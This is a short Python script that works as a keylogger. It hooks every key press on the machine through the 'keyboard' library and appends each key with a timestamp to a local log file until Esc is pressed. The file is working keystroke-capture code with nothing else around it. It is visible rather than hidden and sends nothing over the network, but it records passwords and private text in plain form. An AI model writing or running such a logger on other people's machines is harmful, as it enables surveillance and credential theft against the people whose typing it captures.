import keyboard
import time
from datetime import datetime


def on_key_press(event):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("keystrokes.log", "a") as log_file:
        log_file.write(f"{timestamp} - Key pressed: {event.name}\n")


def main():
    print("Keylogger started. Press 'Esc' to stop.")
    keyboard.on_press(on_key_press)

    # Keep the script running until 'Esc' is pressed
    keyboard.wait('esc')


if __name__ == "__main__":
    main()
